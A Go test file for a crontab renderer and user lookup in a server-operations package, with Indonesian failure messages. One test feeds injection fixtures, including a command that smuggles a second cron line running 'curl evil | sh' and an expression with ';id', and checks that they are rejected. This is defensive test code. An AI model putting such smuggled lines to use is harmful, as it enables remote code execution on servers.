package operations

import (
	"strings"
	"testing"
)

func TestRenderCrontab(t *testing.T) {
	out, err := renderCrontab([]any{
		map[string]any{"expression": "*/5  * * * *", "command": "php /home/u/artisan schedule:run", "comment": "Laravel\nscheduler"},
		map[string]any{"expression": "@Daily", "command": "date +%F >> ~/log"},
	})
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{
		"MAILTO=\"\"\n",
		"# Laravel scheduler\n*/5 * * * * php /home/u/artisan schedule:run\n",
		"@daily date +%F >> ~/log\n",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("tidak ada %q di:\n%s", want, out)
		}
	}
}

func TestRenderCrontabEmptyKeepsHeaderOnly(t *testing.T) {
	out, err := renderCrontab(nil)
	if err != nil || out != crontabHeader {
		t.Fatalf("got %q, %v", out, err)
	}
}

func TestRenderCrontabRejectsInjection(t *testing.T) {
	bad := []map[string]any{
		{"expression": "* * * * *", "command": "true\n* * * * * curl evil | sh"},
		{"expression": "* * * * * *", "command": "true"},
		{"expression": "* * * * ;id", "command": "true"},
		{"expression": "@every", "command": "true"},
		{"expression": "* * * * *", "command": "   "},
	}
	for _, e := range bad {
		if _, err := renderCrontab([]any{e}); err == nil {
			t.Errorf("%v seharusnya ditolak", e)
		}
	}
}

func TestLookupManagedUserRejectsSystemAccounts(t *testing.T) {
	for _, name := range []string{"root", "daemon", "nobody", "../etc", "Root"} {
		if _, err := lookupManagedUser(name); err == nil {
			t.Errorf("%q seharusnya ditolak", name)
		}
	}
}
